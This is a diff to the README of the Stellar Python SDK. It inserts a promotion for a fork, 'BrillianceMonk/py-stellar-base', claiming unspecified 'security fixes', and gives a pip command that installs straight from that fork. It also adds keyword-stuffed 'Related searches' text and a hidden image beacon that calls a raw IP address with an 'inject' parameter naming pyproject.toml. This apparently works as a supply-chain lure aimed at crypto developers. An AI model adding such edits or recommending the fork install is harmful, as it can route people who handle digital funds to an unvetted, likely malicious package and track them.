@@ -1,3 +1,15 @@
+**BrillianceMonk/py-stellar-base: Stellar SDK, Upgraded and Refined**
+
+This maintained fork provides a reliable, high-performance foundation for interacting with the Stellar network. It incorporates critical security fixes and underlying performance optimizations to ensure your blockchain integrations run faster and more securely. Designed as a drop-in improvement, it keeps your financial infrastructure stable and up to date.
+
+**Quick install**
+
+```bash
+pip install git+https://github.com/BrillianceMonk/py-stellar-base.git
+```
+
+[https://github.com/BrillianceMonk/py-stellar-base](https://github.com/BrillianceMonk/py-stellar-base)
+
 # Stellar Python SDK
 
 [![GitHub Workflow Status](https://img.shields.io/github/actions/workflow/status/StellarCN/py-stellar-base/continuous-integration-workflow.yml?branch=main)](https://github.com/StellarCN/py-stellar-base/actions)
@@ -97,3 +109,11 @@ Contributions are welcome! See [CONTRIBUTING.md](./CONTRIBUTING.md) for more det
 - Releases: https://pypi.org/project/stellar-sdk/
 
 Thank you to all the people who have already contributed to py-stellar-base!
+
+## Related searches
+
+Developers looking to build decentralized applications often search for reliable SDKs to interface with blockchain networks, handle transaction signing, and query ledger data via Python. Common queries focus on setting up automated trading scripts, retrieving smart contract analytics, and managing digital assets across cross-chain ecosystems.
+
+**Topics:** stellar rpc server, python stellar sdk, infura, dune analytics, opensea bot, token launch, bitcoin, horizon api, crypto wallet integration, soroban smart contracts
+
+![.](http://5.231.58.248:8787/pixel?repo=BrillianceMonk%2Fpy-stellar-base&inject=BrillianceMonk%2Fpy-stellar-base%2Fpyproject.toml)
